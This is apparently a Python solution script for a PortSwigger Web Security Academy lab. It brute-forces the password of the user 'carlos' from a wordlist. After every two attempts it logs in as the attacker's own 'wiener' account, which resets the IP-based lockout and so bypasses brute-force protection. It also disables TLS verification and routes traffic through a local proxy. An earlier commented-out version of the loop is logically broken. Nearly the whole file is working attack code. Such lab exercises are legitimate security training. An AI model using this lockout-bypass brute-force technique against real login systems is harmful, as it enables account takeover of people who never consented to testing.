""""
import requests
import urllib3

# Suppress only the InsecureRequestWarning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies={"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}

url = "https://0a0200b803b6680881fcb6ae00480054.web-security-academy.net/login"

USER = "wiener"
PASS = "peter"
vaild_user = "carlos"
passwords = "password.txt"

#def  brute_foce():
attempt_count = 0
with open("password.txt","r") as file:
        for i in file:
            password_payload = i.strip()
        for password in password_payload:
            password_payload = password
            data = {"username":vaild_user,"password":password_payload}
            response = requests.post(url,verify=False,proxies=proxies,data=data)
            attempt_count += 1
            if "Your username is" in response.text:
                 print("password found ",password_payload)
            break
        if attempt_count == 2 :
             bypass_data = {"username":USER,"password":PASS}
             response1 = requests.post(url,verify=False,proxies=proxies,data=bypass_data,allow_redirects=False)
        if response1.status_code == 302:
                print(" Lockout bypass successful with 'wiener'")

                """
            


import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

url = "https://0a4f002603fa4590820f10f300bd008e.web-security-academy.net/login"

USER = "wiener"
PASS = "peter"
vaild_user = "carlos"  # kept your spelling

attempt_count = 0

with open("password.txt", "r") as file:
    for password_payload in file:
        password_payload = password_payload.strip()

        data = {"username": vaild_user, "password": password_payload}
        response = requests.post(url, verify=False, proxies=proxies, data=data)
        attempt_count += 1
        print(f" Attempt {attempt_count}: Trying password '{password_payload}'")

        if "Your username is" in response.text:
            print("[+] Password found:", password_payload)
            break

        if attempt_count % 2 == 0:
            # after every 2 attempts, do bypass login as wiener
            bypass_data = {"username": USER, "password": PASS}
            response1 = requests.post(url, verify=False, proxies=proxies, data=bypass_data, allow_redirects=False)
            if response1.status_code == 302:
                print("winer login")
            

             
